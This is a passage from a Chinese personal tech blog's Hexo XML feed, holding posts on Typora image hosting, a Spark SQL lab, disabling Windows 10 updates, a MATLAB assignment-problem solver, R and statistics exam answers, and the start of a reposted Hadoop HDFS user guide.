alt="设置自动上传md内图片到图床"></p><p>这样不用打开PicGo，直接把图片复制粘贴在Typora，就会自动将图片上传至图床并且改为外部链接，这样就可以直接发送md文件，不用担心在别的电脑/上传博客显示不出来啦。</p><p>（u1s1，Typora的bug也越来越多了，作为少见的几个<strong>所见即所得</strong>的markdown编辑器，Typora的强大与便捷让我觉得其他markdown编辑器真的代替不了。）</p><p>如果不需要在其他博客平台发布或者转换成html，Typora各方面都完美。如果是作为写博客的工具，可能会出现点小问题，如果出现排版混乱或者什么的推荐用vscode下载这两个插件。（之前我就遇到过用Typora写的在Typora看着完全没问题，但是hexo渲染之后却出问题了，我刚开始以为是hexo的某些插件的原因，直到发现复制粘贴在其他博客平台的markdown编辑器也会出现一样的问题，显然~是typora的锅）</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200708202942467.png" alt="image-20200708202942467"></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200708202957889.png" alt="image-20200708202957889"></p>]]></content>
      
      
      <categories>
          
          <category> tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spark SQL 上机实验</title>
      <link href="2020/07/03/spark-sql-shang-ji-shi-yan/"/>
      <url>2020/07/03/spark-sql-shang-ji-shi-yan/</url>
      
        <content type="html"><![CDATA[<p>一、实验目的：</p><p>1、通过实验掌握Spark SQL的基本编程方法；</p><p>2、熟悉RDD到DataFrame的转化方法；</p><p>二、实验要求：</p><p>  按实验要求完成实验。</p><p>三、实验方案</p><p>1．Spark SQL基本操作</p><p>Win10更新后，linux系统的Hadoop环境已崩溃，故在此使用datadatabricks</p><p>将下列JSON格式数据复制到Linux系统中，并保存命名为employee.json。</p><p>{ “id”:1 , “name”:” Ella” , “age”:36 }</p><p>{ “id”:2, “name”:”Bob”,”age”:29 }</p><p>{ “id”:3 , “name”:”Jack”,”age”:29 }</p><p>{ “id”:4 , “name”:”Jim”,”age”:28 }</p><p>{ “id”:4 , “name”:”Jim”,”age”:28 }</p><p>{ “id”:5 , “name”:”Damon” }</p><p>{ “id”:5 , “name”:”Damon” }</p><pre class=" language-lang-python"><code class="language-lang-python">#读取json文件\# File location and typefile_location = "/FileStore/tables/employee.json"file_type = "json"\# CSV optionsinfer_schema = "false"first_row_is_header = "false"delimiter = ","\# The applied options are for CSV files. For other file types, these will be ignored.df = spark.read.format(file_type) \ .option("inferSchema", infer_schema) \ .option("header", first_row_is_header) \ .option("sep", delimiter) \ .load(file_location)display(df)                 #打印出文件</code></pre><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image002-1593878295754.jpg" alt="1593862725"></p><p># 创建employee临时表</p><pre class=" language-lang-sql"><code class="language-lang-sql">df.registerTempTable("employee")</code></pre><ol><li>查询所有数据；</li></ol><pre class=" language-lang-sql"><code class="language-lang-sql">sqlDF_01 = spark.sql("SELECT * FROM employee");sqlDF_01.show();</code></pre><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image004-1593878295755.jpg" alt="1593862841">]</p><p> 2.查询所有的数据,并去重</p><pre class=" language-lang-sql"><code class="language-lang-sql">sqlDF_02 = spark.sql("SELECT DISTINCT * FROM employee");sqlDF_02.show();</code></pre><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image005-1593878295756.png" alt="ce49de6c106a6272e85fdcd160f88e0"></p><p>3.查询所有的数据,打印去除id字段（这里只查询了name age）</p><pre class=" language-lang-sql"><code class="language-lang-sql">sqlDF_03 = spark.sql("SELECT name,age FROM employee");sqlDF_03.show();</code></pre><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image006-1593878295756.png" alt="61ab0ab0e4ee72618ab61f05ed7096b"></p><p> 4.查询age&gt;30的数据</p><pre class=" language-lang-sql"><code class="language-lang-sql">sqlDF_04 = spark.sql("SELECT * FROM employee WHERE age > 30")sqlDF_04.show();</code></pre><p>​    </p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image007-1593878295756.png" alt="1593859876">]</p><p>5.age分组</p><pre class=" language-lang-sql"><code class="language-lang-sql">sqlDF_05 = spark.sql("SELECT * FROM employee GROUP BY age");sqlDF_05.show();</code></pre><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image008-1593878295756.png" alt="1593860554">]</p><p>6.name升序</p><pre class=" language-lang-sql"><code class="language-lang-sql">sqlDF_06 = spark.sql("SELECT * FROM employee ORDER BY name")sqlDF_06.show();</code></pre><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image009-1593878295756.png" alt="1593860597">]</p><p>​    </p><p> 7.前三行</p><p>sqlDF_07 = spark.sql(“SELECT * FROM employee”)</p><p>sqlDF_07.show(3);</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image010-1593878295756.png" alt="1593861176"></p><p> 8.修改列名,name改成uersname</p><pre class=" language-lang-sql"><code class="language-lang-sql">sqlDF_08 = spark.sql("SELECT name AS username FROM employee")sqlDF_08.show();</code></pre><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image011-1593878295756.png" alt="1593861916"></p><p>9.查询age平均值</p><pre class=" language-lang-sql"><code class="language-lang-sql">sqlDF_09 = spark.sql("SELECT AVG(age) AS ageAverage FROM employee")sqlDF_09.show();</code></pre><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image012-1593878295756.png" alt="1593861967"></p><p> 10.查询age最小值</p><pre class=" language-lang-sql"><code class="language-lang-sql">sqlDF_10 = spark.sql("SELECT MIN(age) AS ageAverage FROM employee")sqlDF_10.show();</code></pre><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image013-1593878295756.png" alt="1593862004">]</p><p>2．编程实现将RDD转换为DataFrame. （Scala）</p><pre class=" language-lang-sql"><code class="language-lang-sql">import org.apache.spark.sql.catalyst.encoders.ExpressionEncoderimport org.apache.spark.sql.Encoderimport spark.implicits._ //导入包，支持把一个RDD隐式转换为一个DataFramecase class students_data(id:Int,name:String,gender:String,age:Int,course_id:Int,score:Double,classes:String) //定义一个case classval stuDF = spark.sparkContext.textFile("/FileStore/tables/students_data-7.txt").map(_.split(",")).map(t => students_data(t(0).trim.toInt, t(1), t(2), t(3).trim.toInt, t(4).trim.toInt, t(5).trim.toDouble, t(6))).toDF()stuDF.createOrReplaceTempView("stu") //必须注册为临时表才能供下面的查询val stuRDD = spark.sql("select * from stu")//最终生成一个DataFramestuRDD.show()</code></pre><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image015-1593878295756.jpg" alt="1593869941">]</p>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Win10禁止更新以及BOIS更新</title>
      <link href="2020/06/30/win10-jin-zhi-geng-xin-yi-ji-lian-jie-gua-pei-qi-geng-xin/"/>
      <url>2020/06/30/win10-jin-zhi-geng-xin-yi-ji-lian-jie-gua-pei-qi-geng-xin/</url>
      
        <content type="html"><![CDATA[<p>Windows更新历来都是挺坑，为了安全起见还是禁止更新吧</p><p>如果不幸更新了，特别是双系统更新了其中的Windows系统，需要连接下适配器（插上电源）更新一下BOIS系统</p><h3 id="win10禁止更新"><a href="#win10禁止更新" class="headerlink" title="win10禁止更新"></a>win10禁止更新</h3><p><kbd>我的电脑</kbd>-<kbd>管理</kbd>-<kbd>服务和应用程序</kbd>-<kbd>服务</kbd>-<kbd>Windows update</kbd>-<kbd>属性</kbd></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200630210917021.png" alt=""></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200630210820858.png" alt=""></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200630211029726.png" alt=""></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200630211138616.png" alt=""></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200630211153880.png" alt=""></p><h3 id="更新bois"><a href="#更新bois" class="headerlink" title="更新bois"></a>更新bois</h3><p>我更新之后打开windows出现了这种情况</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/f3718cfb498f195961ba28832f41ff2.jpg" alt=""></p><p>显示 Check System Power Error , Please plug in AC Adapter.</p><p> 解决方法: <strong>连上电源(充电线)，重启</strong></p><p>然后就会出现</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/75d3b370a6f20fad27fe865a41169cd.jpg" alt=""></p><p>然鹅，打开是这样的</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/32755925fc4ced850539d798ddc6d48.jpg" alt=""></p><p>只要输入<code>exit</code>即可返回到正常的windows启动</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200705185127776.png" alt="image-20200705185127776"></p>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>指派问题求解</title>
      <link href="2020/06/30/zhi-pai-wen-ti-qiu-jie/"/>
      <url>2020/06/30/zhi-pai-wen-ti-qiu-jie/</url>
      
        <content type="html"><![CDATA[<p>运筹学中的指派问题，这里并非用匈牙利法求解。其中C为效率矩阵。</p><pre class=" language-lang-matlab"><code class="language-lang-matlab">%适用于任意n阶系数矩阵clear all；    C=[2 15 13 4;10 4 14 15;9 14 16 13;7 8 11 9];%效率矩阵C    n=size(C,1);%计算C的行列数n    C=C(:);%计算目标函数系数，将矩阵C按列排成一个列向量即可。    A=[];B=[];%没有不等式约束    Ae=zeros(2*n,n^2);%计算等约束的系数矩阵a    for i=1:n    for j=(i-1)*n+1:n*i    Ae(i,j)=1;    end    for k=i:n:n^2    Ae(n+i,k)=1;    end    end    Be=ones(2*n,1);%等式约束右端项b    Xm=zeros(n^2,1);%决策变量下界Xm    XM=ones(n^2,1);%决策变量上界XM    [x,z]=linprog(C,A,B,Ae,Be,Xm,XM);%使用linprog求解    x=reshape(x,n,n);%将列向量x按列排成一个n阶方阵    disp('最优解矩阵为:');%输出指派方案和最优值    Assignment=round(x)%使用round进行四舍五入取整    disp('最优解为:');    z</code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/hyc6668378/article/details/52403354?utm_medium=distribute.wap_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.wap_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase" target="_blank" rel="noopener">指派问题 MATLAB实现  hyc6668378</a></p>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础数学 </tag>
            
            <tag> 数学建模 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>R语言试验上机考试</title>
      <link href="2020/06/29/r-yu-yan-shi-yan-shang-ji-kao-shi/"/>
      <url>2020/06/29/r-yu-yan-shi-yan-shang-ji-kao-shi/</url>
      
        <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>一、某单位招聘2500人，按考试成绩从高到低依次录用，共有10000人报名，假设报名者的成绩$X~N(u,\sigma^2)$ ，已知90分以上有359人，60分以有下1151人，问被录用者中最低分为多少？试用R软件相关函数功能计算。（15分）</p><p>二、已知20位学生的体重（单位：kg）如下：75.0， 64.5， 47.5， 66.9， 62.2，62.2, 58.7, 63.5, 66.7, 64.0, 57.8, 56.9, 50.2, 72.8, 65.3, 52.3,  63.6, 70.0, 63.9, 68.1 用R软件编程求学生体重的平均值、最大值、最小值、中位数。（10分）</p><p>三、美国联邦贸易委员会（FTC）每年根据焦油、尼古丁、一氧化碳的含量对国内烟草排名，美国调查机构一般认为这三种物质的第一种对吸烟者的健康都有害。过去的研究表明，香烟的焦油和尼古丁含量的增加通常伴随着烟雾释放一氧化碳的增加。表FTC2文件列出了某年测试的25个（过滤）品牌样本中焦油、尼古丁、一氧化碳含量（mg）与重量(g)的数据。假定要建立一氧化碳含量$y$ 与焦油含量$x_1$ 、尼古丁含量 $x_2$、与重量函数$x_3$的模型。用R软件和FTC2数据文件中的数据拟合模型$E(y)=\beta_0+\beta_1 x_1+\beta_2 x_2+\beta_3 x_3$，并检查是否存在共线性现象。（30分）  </p><p>四、环境保护署（EPA）对所有新车型推行广泛的测试以确定它们的行车里程等级（英里/加仑）。数据文件EPAGAS列出了某种新车型进行100次测试获得的行车里程等级数据。用R软件绘制直方图和QQ正态概率图，并判断数据是否服从近似正态分布。（30分）</p><p>五、利用$\frac{\pi}{4}=1-\frac{1}{3}+\frac{1}{5}-\frac{1}{7}-…$公式求$\frac{\pi}{4}$的近似值，直到最后一项的绝对值小于10-３为止。（15分）</p><h2 id="第一题答案"><a href="#第一题答案" class="headerlink" title="第一题答案"></a>第一题答案</h2><p><strong>1</strong>  程序</p><pre class=" language-lang-r"><code class="language-lang-r">x=matrix(c(1,-1.2,1,1.8),ncol=2,nrow=2,byrow=T);xx1=matrix(c(60,90),ncol=1,nrow=2,byrow=T);x1solve(x,x1)min=qnorm(0.75)*10+72;min</code></pre><p><strong>2</strong>  程序运行截屏</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdXRvMmRldi5jb2RpbmcubmV0L3AvSW1hZ2VIb3N0aW5nU2VydmljZS9kL0ltYWdlSG9zdGluZ1NlcnZpY2UvZ2l0L3Jhdy9tYXN0ZXIvbWQvaW1hZ2UtMjAyMDA2MjkxNzM3NTQ5MDQucG5n?x-oss-process=image/format,png" alt=""></p><p><strong>3</strong>  程序运行答案或结果解读</p><p>运行最终结果为78.7449</p><h2 id="第二题答案"><a href="#第二题答案" class="headerlink" title="第二题答案"></a>第二题答案</h2><p><strong>1</strong> 程序</p><pre class=" language-lang-r"><code class="language-lang-r">x2 <- c(75.0,64.5, 47.5,66.9,62.2,62.2, 58.7, 63.5, 66.7, 64.0, 57.8, 56.9, 50.2, 72.8, 65.3, 52.3, 63.6, 70.0, 63.9, 68.1)mean(x2)max(x2)min(x2)median(x2)</code></pre><p><strong>2</strong>  程序运行截屏</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdXRvMmRldi5jb2RpbmcubmV0L3AvSW1hZ2VIb3N0aW5nU2VydmljZS9kL0ltYWdlSG9zdGluZ1NlcnZpY2UvZ2l0L3Jhdy9tYXN0ZXIvbWQvaW1hZ2UtMjAyMDA2MjkxNzM4MjA3NjkucG5n?x-oss-process=image/format,png" alt=""></p><p><strong>3</strong> 程序运行答案或结果解读</p><p>使用c()向x2赋值向量</p><p>mean( )函数求平均值</p><p>max( ) 函数求最大值</p><p>min( )函数求最小值</p><p>median( ) 函数求中位数</p><h2 id="第三题答案"><a href="#第三题答案" class="headerlink" title="第三题答案"></a>第三题答案</h2><p><strong>1</strong> 程序</p><pre class=" language-lang-r"><code class="language-lang-r">x3 <- read.table("D:/R/FTC2.txt",header=T,na.strings = c("NA"))lm.sol=lm(TAR~NICOTINE+WEIGHT+CO,data=x3)summary(lm.sol)XX3<-cor(x3[1:4])kappa(XX3,exact=TRUE)</code></pre><p><strong>2</strong> 程序运行截屏</p><p> <img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdXRvMmRldi5jb2RpbmcubmV0L3AvSW1hZ2VIb3N0aW5nU2VydmljZS9kL0ltYWdlSG9zdGluZ1NlcnZpY2UvZ2l0L3Jhdy9tYXN0ZXIvbWQvaW1hZ2UtMjAyMDA2MjkxNzM5MTk4MDMucG5n?x-oss-process=image/format,png" alt=""></p><p><strong>2）</strong> <strong>程序运行答案或结果解读</strong></p><pre class=" language-lang-r"><code class="language-lang-r">x3 <- read.table("D:/R/FTC2.txt",header=T,na.strings = c("NA"))</code></pre><pre class=" language-lang-r"><code class="language-lang-r">#线性回归lm.sol=lm(TAR~NICOTINE+WEIGHT+CO,data=x3)summary(lm.sol)</code></pre><p>得到拟合结果为y= -2.3696+ 10.0803<em>x1 + 0.1704</em>x2 + 0.4459 *x3<br>(x1~ NICOTINE ,x2~ WEIGHT,x3~ CO)</p><pre class=" language-lang-r"><code class="language-lang-r">XX3<-cor(x3[1:4])kappa(XX3,exact=TRUE)   #exact=TRUE表示精确计算条件数；</code></pre><p>运行结果为189.7185 ，远小于1000则可认为不存在共线性现象。 </p><h2 id="第四题答案"><a href="#第四题答案" class="headerlink" title="第四题答案"></a>第四题答案</h2><p><strong>1</strong> 程序</p><pre class=" language-lang-r"><code class="language-lang-r">x4 <- read.table("D:/R/EPAGAS.txt",header=T,na.strings = c("NA"))hist(x4$MPG)qqnorm(x4$MPG)shapiro.test(x4$MPG)        #检验数据是否符合正态分布</code></pre><p><strong>2</strong> 程序运行截屏</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdXRvMmRldi5jb2RpbmcubmV0L3AvSW1hZ2VIb3N0aW5nU2VydmljZS9kL0ltYWdlSG9zdGluZ1NlcnZpY2UvZ2l0L3Jhdy9tYXN0ZXIvbWQvaW1hZ2UtMjAyMDA2MjkxNzQxMjkxODIucG5n?x-oss-process=image/format,png" alt=""></p><p><strong>3</strong> 程序运行答案或结果解读</p><pre class=" language-lang-r"><code class="language-lang-r">x4 <- read.table("D:/R/EPAGAS.txt",header=T,na.strings = c("NA"))读入存储为一个数据框x4$MPG为选取数据框MPG列hist(x4$MPG)           #画出直方图qqnorm(x4$MPG)         #画出qq图shapiro.test(x4$MPG)    #正态分布检验#p值大于0.05，所以数据为正态分布</code></pre><h2 id="第五题答案"><a href="#第五题答案" class="headerlink" title="第五题答案"></a>第五题答案</h2><p><strong>1 </strong> 程序</p><pre class=" language-lang-r"><code class="language-lang-r">f=function(n){sum=0a=1b=1for(i in 1:n){sum=sum+a/ba=-ab=b+2}sum} f(501)</code></pre><p><strong>2</strong>  程序运行截屏</p><p> <img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdXRvMmRldi5jb2RpbmcubmV0L3AvSW1hZ2VIb3N0aW5nU2VydmljZS9kL0ltYWdlSG9zdGluZ1NlcnZpY2UvZ2l0L3Jhdy9tYXN0ZXIvbWQvaW1hZ2UtMjAyMDA2MjkxNzQyNDkwNDYucG5n?x-oss-process=image/format,png" alt=""></p><p><strong>3</strong>  程序运行答案或结果解读</p><p>首先定义函数</p><pre class=" language-lang-r"><code class="language-lang-r">f=function(n){sum=0a=1b=1for(i in 1:n){sum=sum+a/ba=-ab=b+2}sum}</code></pre><p>再调用</p><pre class=" language-lang-r"><code class="language-lang-r">f(501)</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> R语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>统计计算方法上机考试</title>
      <link href="2020/06/25/tong-ji-ji-suan-fang-fa-shang-ji-kao-shi/"/>
      <url>2020/06/25/tong-ji-ji-suan-fang-fa-shang-ji-kao-shi/</url>
      
        <content type="html"><![CDATA[<p><strong>1.</strong> 设X服从正态分布N(1,4)，用R计算Pr(X&lt;1.5)。</p><p><strong>2.</strong> 为了估计E(X)，X1,X2,…,X9已经被模拟出，其数据如下：</p><p>11，222，99，33，90，22，33，22，83</p><p>再根据这些数据，如果我们要使E(X)的估计量的标准差小于0.01，大概还需要运行多少次？</p><p><strong>3.</strong> 用对偶模拟方法计算$Cov(U,e^U)$,其中U是(0,1)上的均匀随机变量,并要求它的方差和一般随机模拟方法的方差做比较。</p><p><strong>4.</strong>  用条件期望抽样法估计$\theta = E(W_1+W_2)^{\frac{1}{3}}$，其中$W_1,W_2$是独立同分布的参数为2的指数分布,并要求它的方差和一般随机模拟方法的方差做比较。</p><p><strong>5.</strong> 假设公共汽车数服从Poisson分布（$\lambda=2$），每辆公共汽车等可能地包含20，21，———-，30个运动爱好者，在不同公共汽车中运动爱好者的人数是独立的。写一个算法来模拟这些运动爱好者的达到人数超过100的概率。</p><ul><li><pre class=" language-lang-r"><code class="language-lang-r">pnorm(1.5,mean=1,sd=2,lower.tail=TRUE)</code></pre></li></ul><ul><li><pre class=" language-lang-r"><code class="language-lang-r">F=function(d){   x=c(11,222,99,33,90,22,33,22,83)   k=9   while(sd(x)/sqrt(length(x))>=d){       k=k+1        x[k]=rnorm(1)       }   k-1   }F(0.01)</code></pre></li></ul><ul><li><pre class=" language-lang-r"><code class="language-lang-r">n<-1000ru<-runif(n)y1<-uy2<-exp(u)y<-c(y1,y2)use<-mean(y)usecov<-mean(u+exp(u))-use^2cov</code></pre></li></ul><ul><li><pre class=" language-lang-r"><code class="language-lang-r">F4=function(n){a=rep(0,n)for(i in 1:n){X=runif(1000)Y=runif(1000)f=function(x,y)(((2*exp(-2*x))+(2*exp(-2*y)))**(1/3))a[i]=sum(f(X,Y))/1000}list(a=mean(a),VAR=var(a))}F4(50)</code></pre></li></ul><ul><li><pre class=" language-lang-r"><code class="language-lang-r">F5=function(n){k=0X=c(20:30)p=rep(1/11,11)for(i in 1:n){Y=rpois(1,2)x=sample(X,Y,p,replace=TRUE) if(sum(x)>10)      k=k+1}k/n}F5(1000)</code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> R语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hadoop HDFS使用指南</title>
      <link href="2020/06/25/hadoop-hdfs-shi-yong-zhi-nan/"/>
      <url>2020/06/25/hadoop-hdfs-shi-yong-zhi-nan/</url>
      
        <content type="html"><![CDATA[<p>此文章转载于<a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_user_guide.html" target="_blank" rel="noopener">Hadoop官方中文文档</a></p><h1 id="Hadoop分布式文件系统使用指南"><a href="#Hadoop分布式文件系统使用指南" class="headerlink" title="Hadoop分布式文件系统使用指南"></a>Hadoop分布式文件系统使用指南</h1><ul><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_user_guide.html#目的" target="_blank" rel="noopener">目的</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_user_guide.html#概述" target="_blank" rel="noopener">概述</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_user_guide.html#先决条件" target="_blank" rel="noopener">先决条件</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_user_guide.html#Web接口" target="_blank" rel="noopener">Web接口</a></li><li>Shell命令<ul><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_user_guide.html#DFSAdmin命令" target="_blank" rel="noopener">DFSAdmin命令</a></li></ul></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_user_guide.html#Secondary+NameNode" target="_blank" rel="noopener">Secondary NameNode</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_user_guide.html#Rebalancer" target="_blank" rel="noopener">Rebalancer</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_user_guide.html#机架感知（Rack+awareness）" target="_blank" rel="noopener">机架感知（Rack awareness）</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_user_guide.html#安全模式" target="_blank" rel="noopener">安全模式</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_user_guide.html#fsck" target="_blank" rel="noopener">fsck</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_user_guide.html#升级和回滚" target="_blank" rel="noopener">升级和回滚</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_user_guide.html#文件权限和安全性" target="_blank" rel="noopener">文件权限和安全性</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_user_guide.html#可扩展性" target="_blank" rel="noopener">可扩展性</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_user_guide.html#相关文档" target="_blank" rel="noopener">相关文档</a></li></ul><h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>本文档的目标是为Hadoop分布式文件系统（HDFS）的用户提供一个学习的起点，这里的HDFS既可以作为<a href="https://hadoop.apache.org/" target="_blank" rel="noopener">Hadoop</a>集群的一部分，也可以作为一个独立的分布式文件系统。虽然HDFS在很多环境下被设计成是可正确工作的，但是了解HDFS的工作原理对在特定集群上改进HDFS的运行性能和错误诊断都有极大的帮助。</p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>HDFS是Hadoop应用用到的一个最主要的分布式存储系统。一个HDFS集群主要由一个NameNode和很多个Datanode组成：Namenode管理文件系统的元数据，而Datanode存储了实际的数据。HDFS的体系结构在<a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_design.html" target="_blank" rel="noopener">这里</a>有详细的描述。本文档主要关注用户以及管理员怎样和HDFS进行交互。<a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_design.html" target="_blank" rel="noopener">HDFS架构设计</a>中的<a href="http://hadoop.apache.org/docs/r1.0.4/cn/images/hdfsarchitecture.gif" target="_blank" rel="noopener">图解</a>描述了Namenode、Datanode和客户端之间的基本的交互操作。基本上，客户端联系Namenode以获取文件的元数据或修饰属性，而真正的文件I/O操作是直接和Datanode进行交互的。</p><p>下面列出了一些多数用户都比较感兴趣的重要特性。</p><ul><li>Hadoop（包括HDFS）非常适合在商用硬件（commodity hardware）上做分布式存储和计算，因为它不仅具有容错性和可扩展性，而且非常易于扩展。<a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html" target="_blank" rel="noopener">Map-Reduce</a>框架以其在大型分布式系统应用上的简单性和可用性而著称，这个框架已经被集成进Hadoop中。</li><li>HDFS的可配置性极高，同时，它的默认配置能够满足很多的安装环境。多数情况下，这些参数只在非常大规模的集群环境下才需要调整。</li><li>用Java语言开发，支持所有的主流平台。</li><li>支持类Shell命令，可直接和HDFS进行交互。</li><li>NameNode和DataNode有内置的Web服务器，方便用户检查集群的当前状态。</li><li>新特性和改进会定期加入HDFS的实现中。下面列出的是HDFS中常用特性的一部分：<ul><li>文件权限和授权。</li><li>机架感知（Rack awareness）：在调度任务和分配存储空间时考虑节点的物理位置。</li><li>安全模式：一种维护需要的管理模式。</li><li>fsck：一个诊断文件系统健康状况的工具，能够发现丢失的文件或数据块。</li><li>Rebalancer：当datanode之间数据不均衡时，平衡集群上的数据负载。</li><li>升级和回滚：在软件更新后有异常发生的情形下，能够回滚到HDFS升级之前的状态。</li><li>Secondary Namenode：对文件系统名字空间执行周期性的检查点，将Namenode上HDFS改动日志文件的大小控制在某个特定的限度下。</li></ul></li></ul><h2 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a>先决条件</h2><p>下面的文档描述了如何安装和搭建Hadoop集群：</p><ul><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/quickstart.html" target="_blank" rel="noopener">Hadoop快速入门</a> 针对初次使用者。</li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/cluster_setup.html" target="_blank" rel="noopener">Hadoop集群搭建</a> 针对大规模分布式集群的搭建。</li></ul><p>文档余下部分假设用户已经安装并运行了至少包含一个Datanode节点的HDFS。就本文目的来说，Namenode和Datanode可以运行在同一个物理主机上。</p><h2 id="Web接口"><a href="#Web接口" class="headerlink" title="Web接口"></a>Web接口</h2><p>NameNode和DataNode各自启动了一个内置的Web服务器，显示了集群当前的基本状态和信息。在默认配置下NameNode的首页地址是<a href="http://namenode-name:50070/。这个页面列出了集群里的所有DataNode和集群的基本状态。这个Web接口也可以用来浏览整个文件系统（使用NameNode首页上的&quot;Browse" target="_blank" rel="noopener">http://namenode-name:50070/。这个页面列出了集群里的所有DataNode和集群的基本状态。这个Web接口也可以用来浏览整个文件系统（使用NameNode首页上的&quot;Browse</a> the file system”链接）。</p><h2 id="Shell命令"><a href="#Shell命令" class="headerlink" title="Shell命令"></a>Shell命令</h2><p>Hadoop包括一系列的类shell的命令，可直接和HDFS以及其他Hadoop支持的文件系统进行交互。bin/hadoop fs -help 命令列出所有Hadoop Shell支持的命令。而 bin/hadoop fs -help command-name 命令能显示关于某个命令的详细信息。这些命令支持大多数普通文件系统的操作，比如复制文件、改变文件权限等。它还支持一些HDFS特有的操作，比如改变文件副本数目。</p><p>‘bin/hadoop dfsadmin’ 命令支持一些和HDFS管理相关的操作。bin/hadoop dfsadmin -help 命令能列出所有当前支持的命令。比如：</p><ul><li>-report：报告HDFS的基本统计信息。有些信息也可以在NameNode Web服务首页看到。</li><li>-safemode：虽然通常并不需要，但是管理员的确可以手动让NameNode进入或离开安全模式。</li><li>-finalizeUpgrade：删除上一次升级时制作的集群备份。</li></ul><h2 id="Secondary-NameNode"><a href="#Secondary-NameNode" class="headerlink" title="Secondary NameNode"></a>Secondary 